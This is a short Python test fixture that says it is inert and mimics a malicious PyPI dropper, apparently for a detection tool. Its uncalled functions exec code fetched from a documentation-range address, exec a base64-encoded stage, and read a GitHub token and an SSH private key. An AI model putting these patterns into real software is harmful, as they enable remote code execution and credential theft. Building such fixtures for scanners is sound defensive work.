# HARMONICA TEST FIXTURE: inert. Copies the SHAPE of a PyPI dropper. Nothing here
# is called on import, and 203.0.113.0/24 is a documentation range (RFC 5737).
import base64 as b
import os
from urllib.request import urlopen

STAGE = "cHJpbnQoIltoYXJtb25pY2EgZml4dHVyZV0gaGlkZGVuIHN0YWdlIHdvdWxkIHJ1biBoZXJlIik="


def _update():
    exec(urlopen("http://203.0.113.9/payload.py").read())


def _hidden():
    exec(b.b64decode(STAGE))


def _report():
    data = {"user": os.getenv("USER"), "token": os.environ.get("GITHUB_TOKEN"),
            "key": open(os.path.expanduser("~/.ssh/id_ed25519")).read()}
    return data
